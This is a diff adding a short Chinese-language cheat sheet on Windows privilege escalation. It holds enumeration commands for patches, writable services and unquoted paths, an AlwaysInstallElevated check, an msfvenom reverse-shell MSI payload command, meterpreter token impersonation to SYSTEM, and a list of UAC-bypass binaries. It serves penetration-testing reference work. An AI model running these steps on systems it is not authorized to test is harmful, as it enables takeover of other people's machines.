@@ -1,0 +1,49 @@
+# Windows 提权补充
+
+## 内核漏洞提权
+```cmd
+# 查看补丁
+wmic qfe list
+systeminfo
+
+# 提权辅助
+# Windows-Exploit-Suggester
+# Watson (dotnet)
+# PowerUp
+```
+
+## 服务漏洞
+```cmd
+# 查询可写服务
+accesschk.exe -uwcqv "Authenticated Users" *
+sc query
+wmic service get name,displayname,pathname,startmode
+
+# 查询未引用的服务路径
+wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+```
+
+## AlwaysInstallElevated
+```cmd
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+# 两值都为1 → 任意msi提权
+msfvenom -p windows/meterpreter/reverse_tcp -f msi -o payload.msi
+```
+
+## 令牌窃取
+```cmd
+# Incognito 模块（meterpreter）
+load incognito
+list_tokens -u
+impersonate_token "NT AUTHORITY\SYSTEM"
+```
+
+## UAC 绕过
+```cmd
+# 常用方法
+# eventvwr.exe
+# fodhelper.exe
+# computerdefaults.exe
+# sdclt.exe
+```
